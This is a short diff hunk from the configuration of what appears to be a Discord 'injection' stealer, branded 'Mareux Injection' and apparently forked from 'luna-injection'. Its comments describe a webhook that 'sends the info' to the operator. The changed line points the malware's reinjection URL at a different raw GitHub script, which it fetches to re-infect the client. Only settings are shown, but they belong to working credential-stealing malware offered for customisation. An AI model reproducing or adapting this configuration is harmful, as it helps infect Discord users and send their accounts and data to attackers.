@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Mareux Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://media.discordapp.net/attachments/1076860114008543233/1087424479493378099/ff1414427d3864c81e6e342c86af199f.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Krex381/injection_mareux/main/inj.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
